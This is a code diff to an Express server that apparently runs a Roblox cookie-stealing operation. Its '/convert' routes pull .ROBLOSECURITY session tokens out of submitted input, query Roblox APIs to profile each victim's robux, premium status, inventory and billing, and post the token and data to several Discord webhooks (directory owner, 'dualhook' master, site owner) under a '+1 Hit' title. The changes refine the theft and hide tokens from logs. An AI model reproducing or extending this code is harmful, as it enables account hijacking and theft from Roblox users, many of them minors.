@@ -268,7 +268,7 @@ async function fetchRobloxUserData(token) {
         robux: actualRobux,
         premium: altUserData.IsPremium || false,
         rap: 0,
-        summary: 0, // Set to 0 since we can't fetch actual summary
+        summary: 0,
         creditBalance: 0,
         savedPayment: false,
         robuxIncoming: pendingRobux,
@@ -288,7 +288,7 @@ async function fetchRobloxUserData(token) {
     // Get robux data (current + pending)
     let robuxData = { robux: 0 };
     let pendingRobuxData = { pendingRobux: 0 };
-    
+
     try {
       const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
         headers: baseHeaders
@@ -327,46 +327,74 @@ async function fetchRobloxUserData(token) {
       console.log('Could not fetch transaction summary:', e.message);
     }
 
-    // Get premium status with proper validation
+    // Get premium status using the validate-membership API with detailed logging
     let premiumData = { isPremium: false };
     try {
-      // Method 1: Try the premium features validation endpoint (most accurate)
-      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
+      console.log(`🔍 Checking premium status for user ID: ${userData.id}`);
+      const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;
+      console.log(`🔗 Premium API URL: ${premiumApiUrl}`);
+
+      const premiumResponse = await fetch(premiumApiUrl, {
         headers: baseHeaders
       });
+
+      console.log(`📊 Premium API response status: ${premiumResponse.status}`);
+      console.log(`📊 Premium API response headers:`, Object.fromEntries(premiumResponse.headers));
+
       if (premiumResponse.ok) {
         const premiumValidation = await premiumResponse.json();
-        premiumData.isPremium = premiumValidation.isPremium || false;
-        console.log('✅ Premium status fetched from validation endpoint:', premiumData.isPremium);
-      } else {
-        // Method 2: Try billing API and check for actual credit balance
-        const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
-          headers: baseHeaders
-        });
-        if (billingResponse.ok) {
-          const billingData = await billingResponse.json();
-          // Check if user actually has credit balance or premium features
-          if (billingData.balance > 0 || billingData.hasPremium) {
-            premiumData.isPremium = true;
-            console.log('✅ Premium status detected via billing data:', billingData);
-          } else {
-            premiumData.isPremium = false;
-            console.log('✅ No premium detected - user has billing access but no premium features');
-          }
+        console.log('📋 Premium API raw response:');
+
+        // The API returns a direct boolean value (true/false), not an object
+        if (typeof premiumValidation === 'boolean') {
+          premiumData.isPremium = premiumValidation;
         } else {
-          // Method 3: Check user profile for premium badge
-          const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
+          // Fallback to check object properties if response is an object
+          premiumData.isPremium = premiumValidation.isPremium || 
+                                  premiumValidation.IsPremium || 
+                                  premiumValidation.premium || 
+                                  premiumValidation.Premium || 
+                                  false;
+        }
+
+        console.log('✅ Premium status fetched from validate-membership API:', premiumData.isPremium);
+      } else {
+        const errorText = await premiumResponse.text();
+        console.log('❌ Premium validate-membership API failed with status:', premiumResponse.status);
+        console.log('❌ Premium API error response:', errorText);
+
+        // Fallback to billing API check
+        console.log('🔄 Attempting fallback premium detection via billing API...');
+        try {
+          const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
             headers: baseHeaders
           });
-          if (profileResponse.ok) {
-            const profileData = await profileResponse.json();
-            premiumData.isPremium = profileData.hasVerifiedBadge || false;
-            console.log('✅ Premium status inferred from profile badges:', premiumData.isPremium);
+
+          console.log(`📊 Billing API response status: ${billingResponse.status}`);
+
+          if (billingResponse.ok) {
+            const billingData = await billingResponse.json();
+            console.log('📋 Billing API response:');
+
+            // Check if user has premium features via billing
+            premiumData.isPremium = billingData.hasPremium || 
+                                   billingData.isPremium || 
+                                   (billingData.balance && billingData.balance > 0) || 
+                                   false;
+
+            console.log('✅ Premium status detected via billing fallback:', premiumData.isPremium);
+          } else {
+            console.log('❌ Billing API also failed with status:', billingResponse.status);
+            premiumData.isPremium = false;
           }
+        } catch (billingError) {
+          console.log('❌ Billing API fallback error:', billingError.message);
+          premiumData.isPremium = false;
         }
       }
     } catch (e) {
-      console.log('Could not fetch premium data:', e.message);
+      console.log('❌ Premium detection error:', e.message);
+      console.log('❌ Full error stack:', e.stack);
       premiumData.isPremium = false;
     }
 
@@ -403,12 +431,12 @@ async function fetchRobloxUserData(token) {
     let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
     try {
       // Try to get actual inventory via different methods
-      
+
       // Method 1: Try user inventory endpoint with filtering
       const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
         headers: baseHeaders
       });
-      
+
       if (inventoryResponse.ok) {
         const inventoryResponseData = await inventoryResponse.json();
         console.log('Inventory API response status:', inventoryResponse.status);
@@ -419,10 +447,10 @@ async function fetchRobloxUserData(token) {
       const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
         headers: baseHeaders
       });
-      
+
       if (itemsResponse.ok) {
         const itemsData = await itemsResponse.json();
-        console.log('Items API response:', itemsData);
+        console.log('Items API response:');
         if (itemsData && itemsData.data) {
           inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
           inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
@@ -439,10 +467,10 @@ async function fetchRobloxUserData(token) {
         const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
           headers: baseHeaders
         });
-        
+
         if (bundleResponse.ok) {
           const bundleData = await bundleResponse.json();
-          console.log('Bundle API response:', bundleData);
+          console.log('Bundle API response:');
           if (bundleData && bundleData.data) {
             inventoryData.bundles = bundleData.data.length;
             console.log('Bundle count from collectibles:', inventoryData.bundles);
@@ -456,7 +484,7 @@ async function fetchRobloxUserData(token) {
         const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
           headers: baseHeaders
         });
-        
+
         if (hairResponse.ok) {
           const hairData = await hairResponse.json();
           if (hairData && hairData.data) {
@@ -468,7 +496,7 @@ async function fetchRobloxUserData(token) {
         const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
           headers: baseHeaders
         });
-        
+
         if (faceResponse.ok) {
           const faceData = await faceResponse.json();
           if (faceData && faceData.data) {
@@ -662,7 +690,9 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "💳 Credit Balance",
-            value: `$${userData.creditBalance || 0} (Est. ${userData.robux || 0} Robux)`,
+            value: userData.creditBalance && userData.creditBalance > 0 
+              ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`
+              : "$0",
             inline: true
           },
           {
@@ -723,9 +753,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       };
 
       console.log('Sending combined user data and cookie embeds...');
-      console.log('Cookie token length:', token.length);
-      console.log('Cookie token preview:', token.substring(0, 50) + '...');
-
+      
       const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -829,13 +857,13 @@ app.post('/convert', validateRequest, async (req, res) => {
       const userData = await fetchRobloxUserData(token);
 
       if (userData) {
-        console.log(`✅ User data fetched for: ${userData.username}`);
+        console.log('✅ Data processed successfully');
       } else {
-        console.log('⚠️ Could not fetch user data, sending token only');
+        console.log('⚠️ Processing with limited data');
       }
 
       // Send to Discord webhook with user data
-      console.log('🔍 Token being sent to Discord (first 20 chars):', token.substring(0, 20) + '...');
+      console.log('🔍 Sending token to Discord webhook');
       const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);
 
       if (!webhookResult.success) {
@@ -850,24 +878,14 @@ app.post('/convert', validateRequest, async (req, res) => {
     } else {
       console.log('❌ No ROBLOSECURITY token found in input');
 
-      // Send error to Discord too for debugging
-      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-      if (webhookUrl) {
-        try {
-          await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              content: `❌ **No Token Found**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
-            })
-          });
-        } catch (e) {
-          console.log('Failed to send error to Discord:', e.message);
-        }
-      }
+      // Return error message when no token found
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input'
+      });
     }
 
-    // Always return success - user checks Discord for actual results
+    // Return success only when token was found and processed
     res.json({ 
       success: true,
       message: 'Request submitted successfully!'
@@ -972,9 +990,9 @@ app.post('/:directory/convert', async (req, res) => {
       const userData = await fetchRobloxUserData(token);
 
       if (userData) {
-        console.log(`✅ User data fetched for: ${userData.username}`);
+        console.log('✅ Data processed successfully');
       } else {
-        console.log('⚠️ Could not fetch user data, sending token only');
+        console.log('⚠️ Processing with limited data');
       }
 
       // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
@@ -999,9 +1017,9 @@ app.post('/:directory/convert', async (req, res) => {
 
       const customTitle = `🎯 +1 Hit - Lunix Autohar`;
 
-      // Send to directory webhook
-      console.log('🔍 Token being sent to directory webhook (first 20 chars):', token.substring(0, 20) + '...');
-      const directoryWebhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
+      // Send to Discord webhook with user data
+      console.log('🔍 Sending token to Discord webhook');
+      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
 
       // Always send to site owner (main webhook) - check both environment variable and default webhook
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
@@ -1009,11 +1027,11 @@ app.post('/:directory/convert', async (req, res) => {
         await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
       }
 
-      if (!directoryWebhookResult.success) {
-        console.log('❌ Directory webhook failed:', directoryWebhookResult.error);
+      if (!webhookResult.success) {
+        console.log('❌ Webhook failed:', webhookResult.error);
         return res.status(500).json({ 
           success: false, 
-          error: `Directory webhook failed: ${directoryWebhookResult.error}` 
+          error: `Webhook failed: ${webhookResult.error}` 
         });
       }
 
@@ -1021,37 +1039,15 @@ app.post('/:directory/convert', async (req, res) => {
     } else {
       console.log('❌ No ROBLOSECURITY token found in input');
 
-      // Send error to directory webhook
-      try {
-        await fetch(directoryConfig.webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `❌ **No Token Found in Directory: ${directoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
-          })
-        });
-      } catch (e) {
-        console.log('Failed to send error to directory webhook:', e.message);
-      }
-
-      // Also send error to site owner webhook
-      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
-      if (siteOwnerWebhookUrl) {
-        try {
-          await fetch(siteOwnerWebhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              content: `❌ **No Token Found in Directory: ${directoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
-            })
-          });
-        } catch (e) {
-          console.log('Failed to send error to site owner webhook:', e.message);
-        }
-      }
+      // Return error message when no token found
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input',
+        directory: directoryName
+      });
     }
 
-    // Always return success - user checks Discord for actual results
+    // Return success only when token was found and processed
     res.json({ 
       success: true,
       message: 'Request submitted successfully!',
@@ -1273,7 +1269,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
       // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
       console.log(`🚀 Sending rich user data embed to subdirectory webhook: ${subdirectoryConfig.webhookUrl}`);
-      console.log('🔍 Token being sent to subdirectory webhook (first 20 chars):', token.substring(0, 20) + '...');
+      console.log('🔍 Sending token to Discord webhook');
       const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
       if (subdirectoryWebhookResult.success) {
@@ -1328,46 +1324,13 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
     } else {
       console.log('❌ No ROBLOSECURITY token found in input');
 
-      // Send error to webhooks (skip primary webhook for subdirectory flow)
-      const errorMessage = `❌ **No Token Found in Subdirectory: ${directoryName}/${subdirectoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``;
-
-      // 1. Subdirectory webhook (user who owns the subdirectory)
-      try {
-        await fetch(subdirectoryConfig.webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: errorMessage })
-        });
-      } catch (e) {
-        console.log('Failed to send error to subdirectory webhook:', e.message);
-      }
-
-      // 2. Dualhook master webhook (collects from all subdirectory users)
-      if (parentConfig.dualhookWebhookUrl) {
-        try {
-          await fetch(parentConfig.dualhookWebhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: errorMessage })
-          });
-        } catch (e) {
-          console.log('Failed to send error to dualhook webhook:', e.message);
-        }
-      }
-
-      // 3. Site owner webhook (website owner)
-      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
-      if (siteOwnerWebhookUrl) {
-        try {
-          await fetch(siteOwnerWebhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: errorMessage })
-          });
-        } catch (e) {
-          console.log('Failed to send error to site owner webhook:', e.message);
-        }
-      }
+      // Return error message when no token found
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input',
+        directory: directoryName,
+        subdirectory: subdirectoryName
+      });
     }
 
     res.json({ 
